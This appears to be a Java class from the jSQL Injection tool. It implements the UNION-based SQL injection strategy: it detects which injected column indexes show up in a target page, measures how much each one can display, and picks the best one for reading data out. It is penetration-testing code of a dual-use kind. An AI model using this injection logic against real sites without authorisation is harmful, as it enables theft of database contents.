package com.jsql.model.injection.strategy;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.bean.util.Request;
import com.jsql.model.bean.util.TypeRequest;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.suspendable.AbstractSuspendable;
import com.jsql.model.suspendable.SuspendableGetIndexes;
import com.jsql.util.StringUtil;

/**
 * Injection strategy using normal attack.
 */
public class StrategyInjectionNormal extends AbstractStrategy {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    /**
     * 
     */
    private String performanceLength = "0";
    
    /**
     * i.e, 2 in "[..]union select 1,2,[..]", if 2 is found in HTML source.
     */
    private String visibleIndex;

    /**
     * 
     */
    @Override
    public void checkApplicability() throws JSqlException {
        LOGGER.trace("Normal test...");
        MediatorModel.model().setIndexesInUrl(new SuspendableGetIndexes().run());

        // Define visibleIndex, i.e, 2 in "[..]union select 1,2,[..]", if 2 is found in HTML source
        this.visibleIndex = this.getVisibleIndex(MediatorModel.model().getSrcSuccess());
        
        this.isApplicable =
            !"".equals(MediatorModel.model().getIndexesInUrl())
            && new Integer(StrategyInjection.NORMAL.instance().getPerformanceLength()) > 0
            && this.visibleIndex != null
        ;
        
        if (this.isApplicable) {
            LOGGER.debug("Vulnerable to Normal injection using "+ this.performanceLength +" characters");
            this.allow();
        } else {
            this.unallow();
        }
    }

    @Override
    public void allow() {
        this.markVulnerable(TypeRequest.MARK_NORMAL_VULNERABLE);
    }

    @Override
    public void unallow() {
        this.markVulnerable(TypeRequest.MARK_NORMAL_INVULNERABLE);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable<String> stoppable) throws StoppedByUserSlidingException {
        return MediatorModel.model().injectWithIndexes(MediatorModel.model().getVendor().instance().sqlNormal(sqlQuery, startPosition));
    }

    @Override
    public void activateStrategy() {
        LOGGER.info("Using strategy ["+ this.getName() +"]");
        MediatorModel.model().setStrategy(StrategyInjection.NORMAL);
        
        Request request = new Request();
        request.setMessage(TypeRequest.MARK_NORMAL_STRATEGY);
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Runnable class, search the most efficient index.<br>
     * Some indexes will display a lots of characters, others won't,
     * so sort them by order of efficiency:<br>
     * find the one that display the most of characters.
     * @return Integer index with most efficiency and visible in source code
     */
    public String getVisibleIndex(String firstSuccessPageSource) {
        // Parse all indexes found
    	// Fix #4007 (initialize firstSuccessPageSource to "" instead of null)
        Matcher regexSearch = Pattern.compile("(?s)1337(\\d+?)7331").matcher(firstSuccessPageSource);
        
        List<String> foundIndexes = new ArrayList<>();
        while (regexSearch.find()) {
            foundIndexes.add(regexSearch.group(1));
        }

        String[] indexes = foundIndexes.toArray(new String[foundIndexes.size()]);

        // Make url shorter, replace useless indexes from 1337[index]7331 to 1
        String indexesInUrl = MediatorModel.model().getIndexesInUrl().replaceAll("1337(?!"+ StringUtil.join(indexes, "|") +"7331)\\d*7331", "1");

        // Replace correct indexes from 1337(index)7331 to
        // ==> ${LEAD}(index)######...######
        // Search for index that displays the most #
        String performanceQuery = MediatorModel.model().getVendor().instance().sqlCapacity(indexes);
        String performanceSourcePage = MediatorModel.model().injectWithoutIndex(performanceQuery);

        // Build a 2D array of string with:
        //     column 1: index
        //     column 2: # found, so #######...#######
        regexSearch = Pattern.compile("(?s)"+ DataAccess.LEAD +"(\\d+)(#+)").matcher(performanceSourcePage);
        List<String[]> performanceResults = new ArrayList<>();
        while (regexSearch.find()) {
            performanceResults.add(new String[]{regexSearch.group(1), regexSearch.group(2)});
        }

        // Fix #16243: NullPointerException on this.initialQuery.replaceAll() at end of method
        if (performanceResults.isEmpty() || indexesInUrl == null) {
            this.performanceLength = "0";
            // TODO optional
            return null;
        }
        
        // Switch from previous array to 2D integer array
        //     column 1: length of #######...#######
        //     column 2: index
        Integer[][] lengthFields = new Integer[performanceResults.size()][2];
        for (int i = 0; i < performanceResults.size(); i++) {
            lengthFields[i] = new Integer[]{
                performanceResults.get(i)[1].length() + performanceResults.get(i)[0].length(),
                Integer.parseInt(performanceResults.get(i)[0])
            };
        }

        // Sort by length of #######...#######
        Arrays.sort(lengthFields, (Integer[] s1, Integer[] s2) -> s1[0].compareTo(s2[0]));
        
        this.performanceLength = lengthFields[lengthFields.length - 1][0].toString();

        // Replace all others indexes by 1
        indexesInUrl = indexesInUrl.replaceAll(
            "1337(?!"+ lengthFields[lengthFields.length - 1][1] +"7331)\\d*7331",
            "1"
        );
        MediatorModel.model().setIndexesInUrl(indexesInUrl);
        
        return Integer.toString(lengthFields[lengthFields.length - 1][1]);
    }
    
    // Getters and setters
    
    @Override
    public String getPerformanceLength() {
        return this.performanceLength;
    }
    
    public void setPerformanceLength(String performanceLength) {
        this.performanceLength = performanceLength;
    }
    
    public String getVisibleIndex() {
        return this.visibleIndex;
    }

    public void setVisibleIndex(String visibleIndex) {
        this.visibleIndex = visibleIndex;
    }
    
    @Override
    public String getName() {
        return "Normal";
    }
    
}
